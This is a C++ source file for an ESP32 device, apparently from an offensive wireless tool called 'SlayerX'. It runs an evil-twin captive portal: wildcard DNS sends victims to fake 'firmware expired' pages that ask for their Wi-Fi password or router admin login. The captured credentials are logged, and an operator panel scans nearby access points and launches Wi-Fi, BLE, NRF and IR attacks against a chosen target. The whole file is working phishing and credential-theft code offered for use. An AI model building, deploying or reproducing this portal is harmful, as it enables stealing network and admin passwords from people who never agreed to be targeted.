#include "net.h"
#include "config.h"
#include "hal.h"
#include "attack.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>

std::vector<ApInfo> g_aps;
String g_tSsid; uint8_t g_tBssid[6]; uint8_t g_tCh = 1; String g_tPass; bool g_haveTarget = false;

static DNSServer dns;
static WebServer srv(80);
static volatile bool webUp = false;
static volatile int  pageMode = PG_PANEL;
static volatile int  creds = 0;
static String lu, lp;
static TaskHandle_t webTask = nullptr;

static const char* CSS =
  "<style>body{font-family:system-ui,sans-serif;background:#0b0b0f;color:#e8e8ee;margin:0;padding:16px}"
  "h1{font-size:20px;color:#7cf}h2{font-size:14px;color:#9ad;margin:14px 0 6px}"
  "button{background:#1b1b26;color:#e8e8ee;border:1px solid #333;padding:9px 12px;margin:3px;"
  "border-radius:8px;font-size:13px}button.on{background:#7cf;color:#000;border-color:#7cf}"
  "pre{background:#111;border:1px solid #222;padding:10px;border-radius:8px;height:180px;overflow:auto;font-size:11px}"
  "input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #333;background:#15151c;color:#eee}"
  ".big{font-size:64px;text-align:center}</style>";

static const char* PANEL_JS =
  "<script>"
  "async function st(){let r=await fetch('/api/status');let j=await r.json();"
  "document.getElementById('st').innerText=j.running?('RUNNING: '+j.name):'idle';"
  "let g=await fetch('/api/log');document.getElementById('lg').innerText=await g.text();}"
  "async function scan(){document.getElementById('st').innerText='scanning...';"
  "let r=await fetch('/api/scan');let j=await r.json();let h='';"
  "for(let i=0;i<j.length;i++){h+='<button onclick=\"sel('+i+')\">'+j[i].ssid+' ('+j[i].rssi+')</button>';}"
  "document.getElementById('aps').innerHTML=h;window.APS=j;}"
  "let target=null;function sel(i){target=window.APS[i];document.getElementById('tg').innerText='target: '+target.ssid;}"
  "async function go(id){let u='/api/start?id='+id;if(target){u+='&ssid='+encodeURIComponent(target.ssid)+'&ch='+target.ch;"
  "let b=target.bssid.map(x=>x.toString(16).padStart(2,'0')).join('');u+='&bssid='+b;}"
  "await fetch(u);}"
  "async function stopa(){await fetch('/api/stop');}"
  "setInterval(st,1000);st();"
  "</script>";

static void hPanel() {
  String h = "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>";
  h += CSS; h += PANEL_JS; h += "</head><body>";
  h += "<h1>SlayerX Panel</h1><div id=st>idle</div>";
  h += "<p><button onclick=scan()>Scan networks</button><button onclick=stopa()>STOP</button></p>";
  h += "<div id=tg></div><div id=aps></div><pre id=lg></pre>";
  const char* cats[] = { "wifi", "ble", "nrf", "ir" };
  for (auto c : cats) {
    h += "<h2>"; h += c; h += "</h2>";
    int n = atk_count(c);
    for (int i = 0; i < n; i++) {
      const Attack* a = atk_at(c, i);
      h += "<button onclick=\"go('"; h += a->id; h += "')\">"; h += a->name; h += "</button>";
    }
  }
  h += "</body></html>";
  srv.send(200, "text/html", h);
}

static void hScan() {
  net_scan();
  JsonDocument d;
  JsonArray arr = d.to<JsonArray>();
  for (auto& a : g_aps) {
    JsonObject o = arr.add<JsonObject>();
    o["ssid"] = a.ssid; o["rssi"] = a.rssi; o["ch"] = a.ch;
    JsonArray b = o["bssid"].to<JsonArray>();
    for (int i = 0; i < 6; i++) b.add(a.bssid[i]);
  }
  String out; serializeJson(d, out);
  srv.send(200, "application/json", out);
}

static void hStatus() {
  String j = "{\"running\":"; j += atk_running() ? "true" : "false";
  j += ",\"name\":\""; j += atk_running() && atk_current() ? atk_current()->name : "";
  j += "\",\"status\":\""; j += atk_status(); j += "\"}";
  srv.send(200, "application/json", j);
}

static void hLog() { srv.send(200, "text/plain", log_text()); }

static void hStart() {
  const Attack* a = atk_by_id(srv.arg("id").c_str());
  if (!a) { srv.send(400, "text/plain", "bad id"); return; }
  if (srv.hasArg("ssid")) {
    g_tSsid = srv.arg("ssid");
    g_tCh = srv.arg("ch").toInt();
    String bs = srv.arg("bssid");
    for (int i = 0; i < 6; i++)
      g_tBssid[i] = strtol(bs.substring(i * 2, i * 2 + 2).c_str(), NULL, 16);
    g_haveTarget = true;
  }
  atk_start(a);
  srv.send(200, "text/plain", "ok");
}
static void hStop() { atk_stop(); srv.send(200, "text/plain", "ok"); }

static const char* VICTIM_WARN =
  "<h1>Network Update</h1><p>Your Wi-Fi firmware has expired. Enter your password to update.</p>"
  "<form method=POST action=/submit><input name=p type=password placeholder='Wi-Fi password' required>"
  "<button type=submit>Update</button></form>";

static const char* VICTIM_ADMIN =
  "<h1>Router Admin</h1><p>Your Wi-Fi firmware has expired. Enter admin username and password to update.</p>"
  "<form method=POST action=/submit><input name=u placeholder='admin username' required>"
  "<input name=p type=password placeholder='admin password' required>"
  "<button type=submit>Update</button></form>";

static const char* VICTIM_DUMMY =
  "<h1>Free Wi-Fi</h1><div class=big>&#128405;</div><p>Connect and enjoy.</p>";

static void hVictim() {
  String h = "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>";
  h += CSS; h += "</head><body>";
  switch (pageMode) {
    case PG_WARN: h += VICTIM_WARN; break;
    case PG_ADMIN: h += VICTIM_ADMIN; break;
    case PG_DUMMY: h += VICTIM_DUMMY; break;
    default: h += "<p><a href=/panel>SlayerX panel</a></p>"; break;
  }
  h += "</body></html>";
  srv.send(200, "text/html", h);
}

static void hSubmit() {
  if (srv.hasArg("u")) lu = srv.arg("u");
  if (srv.hasArg("p")) lp = srv.arg("p");
  creds++;
  log_line("creds[%d] u=%s p=%s", creds, lu.c_str(), lp.c_str());
  srv.send(200, "text/html", "<h1>Connecting...</h1><p>You can close this page.</p>");
}

static void webTaskFn(void*) {
  while (true) {
    if (webUp) { dns.processNextRequest(); srv.handleClient(); }
    vTaskDelay(pdMS_TO_TICKS(3));
  }
}

void portal_web_start() {
  if (webUp) return;
  dns.start(53, "*", WiFi.softAPIP());
  srv.on("/", hVictim);
  srv.on("/panel", hPanel);
  srv.on("/api/scan", hScan);
  srv.on("/api/status", hStatus);
  srv.on("/api/log", hLog);
  srv.on("/api/start", hStart);
  srv.on("/api/stop", hStop);
  srv.on("/submit", HTTP_POST, hSubmit);
  srv.onNotFound(hVictim);
  srv.begin();
  webUp = true;
  if (!webTask) xTaskCreatePinnedToCore(webTaskFn, "web", 8192, NULL, 1, &webTask, 0);
}
void portal_web_stop() { if (!webUp) return; webUp = false; srv.stop(); dns.stop(); }
void portal_set_page(int m) { pageMode = m; }
int portal_page() { return pageMode; }
void portal_clear_creds() { creds = 0; lu = ""; lp = ""; }
String portal_last_user() { return lu; }
String portal_last_pass() { return lp; }
int portal_cred_count() { return creds; }

void net_init() { WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100); }

int net_scan() {
  g_aps.clear();
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n && i < 40; i++) {
    ApInfo a;
    a.ssid = WiFi.SSID(i);
    memcpy(a.bssid, WiFi.BSSID(i), 6);
    a.rssi = WiFi.RSSI(i);
    a.ch = WiFi.channel(i);
    a.enc = WiFi.encryptionType(i);
    g_aps.push_back(a);
  }
  WiFi.scanDelete();
  return g_aps.size();
}

bool net_ap_start(const char* ssid, const char* pass, uint8_t ch) {
  WiFi.mode(WIFI_AP_STA);
  return WiFi.softAP(ssid, (pass && strlen(pass)) ? pass : nullptr, ch);
}
void net_ap_stop() { WiFi.softAPdisconnect(true); }
bool net_ap_up() { return WiFi.getMode() & WIFI_MODE_AP; }
String net_ap_ip() { return WiFi.softAPIP().toString(); }

bool net_sta_try(const String& ssid, const String& pass, uint32_t ms) {
  WiFi.begin(ssid.c_str(), pass.c_str());
  uint32_t t = millis();
  while (millis() - t < ms) {
    if (WiFi.status() == WL_CONNECTED) return true;
    delay(100);
  }
  return false;
}
bool net_sta_up() { return WiFi.status() == WL_CONNECTED; }
void net_sta_down() { WiFi.disconnect(); }

void portal_set_target(const char* ssid, const uint8_t* bssid, uint8_t ch) {
  g_tSsid = ssid;
  memcpy(g_tBssid, bssid, 6);
  g_tCh = ch;
  g_haveTarget = true;
}